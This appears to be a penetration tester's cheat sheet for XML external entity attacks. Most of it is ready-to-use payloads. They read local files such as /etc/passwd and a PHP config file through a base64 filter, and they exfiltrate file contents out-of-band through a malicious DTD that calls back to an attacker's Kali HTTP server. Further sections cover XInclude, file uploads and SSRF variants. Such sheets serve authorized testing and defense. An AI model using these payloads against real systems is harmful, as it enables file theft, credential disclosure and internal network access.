# XML external entity checks

## Entity check
Compare against a normal document.

```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```
- No output → test blind resolution with a callback.

## Read source and files
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]><r>&x;</r>
```
```bash
printf '%s' '<BASE64>' | base64 -d
```
- Files with `<`, `&` or newlines break plain `file://` output; the base64 filter avoids that (PHP only).
- Windows: `file:///C:/Windows/win.ini`. Directory listing (Java): `file:///var/www/`.

## Blind / out-of-band
`evil.dtd` on Kali (`python3 -m http.server 8000`):
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; send SYSTEM 'http://<KALI>:8000/?d=%f;'>">
%e;
%send;
```
Request body:
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://<KALI>:8000/evil.dtd"> %d;]><r/>
```
- A GET for `evil.dtd` = external entity fetched; the second GET carries the data.
- Multi-line files often break the URL: read single-line files or encode in the DTD.
- No DTD fetch → egress filtered, or entity processing disabled.

## Other XML entry points
- XInclude when you only control a value, not the document: `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>`.
- Uploaded `.svg`, `.docx`, `.xlsx` (XML inside the zip), SOAP bodies, and JSON endpoints that also accept `Content-Type: application/xml`.
- SSRF through XXE: `SYSTEM "http://127.0.0.1:8080/"` → [ssrf](ssrf.md).
